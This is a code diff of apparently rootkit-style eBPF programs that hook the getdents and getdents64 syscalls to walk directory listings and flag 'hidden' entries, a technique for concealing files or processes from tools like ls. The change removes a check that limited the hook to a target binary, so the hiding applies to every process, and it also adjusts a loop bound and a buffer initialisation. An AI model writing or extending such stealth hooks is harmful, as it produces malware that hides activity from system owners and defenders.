@@ -22,7 +22,6 @@
 // └────────────────────────────────────┘
 //----------------------------------------------------
 
-#define MAX_DIR_ITER_LOOP 10000
 
 /**
  * Used in context for bpf_loop since we may be looping on large buffer returned from commands like ls -la /proc
@@ -93,7 +92,7 @@ static long __process_dirent_entry(__u32 index, void *data)
     }
 
     if(hidden && *hidden == 1){
-        char event_str[128];
+        char event_str[128] = {0};
         BPF_SNPRINTF(event_str, sizeof(event_str), "Hooked d_name => %s.", d_name);
 
         send_event(EVENT_TRIGGERED, lctx->syscall_name, event_str);
@@ -163,9 +162,6 @@ int tp_sys_exit_getdents64(struct sys_getdents64_exit_ctx *ctx)
     if(ret <= 0)
         return ret;
 
-    if(!__is_target_bin())
-        return ret;
-
     //get from cache.
     __u64 key  = bpf_get_current_pid_tgid();
 
@@ -189,7 +185,7 @@ int tp_sys_exit_getdents64(struct sys_getdents64_exit_ctx *ctx)
         .ret          = ret
     };
 
-    long nr_completed = bpf_loop(MAX_DIR_ITER_LOOP, __process_dirent_entry, &lctx, 0);
+    long nr_completed = bpf_loop(MAX_ITER_LOOP, __process_dirent_entry, &lctx, 0);
 
     return ret;
 }
@@ -231,7 +227,7 @@ int tp_sys_exit_getdents(struct sys_getdents_exit_ctx *ctx)
         .ret          = ret
     };
 
-    long nr_completed = bpf_loop(MAX_DIR_ITER_LOOP, __process_dirent_entry, &lctx, 0);
+    long nr_completed = bpf_loop(MAX_ITER_LOOP, __process_dirent_entry, &lctx, 0);
 
     return ret;
 }
